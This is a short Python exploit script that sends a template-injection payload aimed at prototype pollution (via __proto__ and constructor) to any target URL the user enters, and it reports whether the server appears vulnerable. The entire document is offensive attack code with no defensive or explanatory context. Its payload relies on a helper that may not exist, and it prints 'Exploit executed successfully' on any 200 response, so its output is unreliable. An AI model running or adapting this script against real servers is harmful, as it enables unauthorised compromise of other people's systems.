import requests
import json

def exploit(url):
    # Payload to exploit Prototype Pollution
    payload = {
        "template": "{{#with __proto__}}{{#with constructor}}{{defineProperty 'polluted' this}}{{/with}}{{/with}}"
    }

    headers = {'Content-Type': 'application/json'}
    try:
        print(f"[+] Sending exploit to {url}...")
        response = requests.post(url, data=json.dumps(payload), headers=headers)

        if response.status_code == 200:
            print("[+] Exploit executed successfully.")
            if 'polluted' in response.text:
                print("[!] The server is vulnerable to prototype pollution!")
            else:
                print("[-] Server responded, but exploit did not seem to work.")
        else:
            print(f"[!] Exploit failed with status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    exploit(target_url)
